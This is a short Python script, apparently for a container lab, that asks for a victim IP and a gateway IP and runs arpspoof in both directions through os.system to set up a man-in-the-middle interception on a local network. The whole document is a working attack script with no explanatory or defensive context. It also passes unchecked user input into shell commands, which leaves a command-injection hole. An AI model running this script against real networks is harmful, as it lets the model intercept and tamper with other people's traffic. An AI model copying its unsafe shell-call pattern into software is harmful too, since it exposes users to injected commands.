# Basic Python script to simulate MITM setup
import os

victim_ip = input("Enter victim IP: ")
gateway_ip = input("Enter gateway IP: ")

# Run ARP spoofing (this needs to be done in the attacker container)
os.system(f"arpspoof -i eth0 -t {victim_ip} {gateway_ip}")
os.system(f"arpspoof -i eth0 -t {gateway_ip} {victim_ip}")
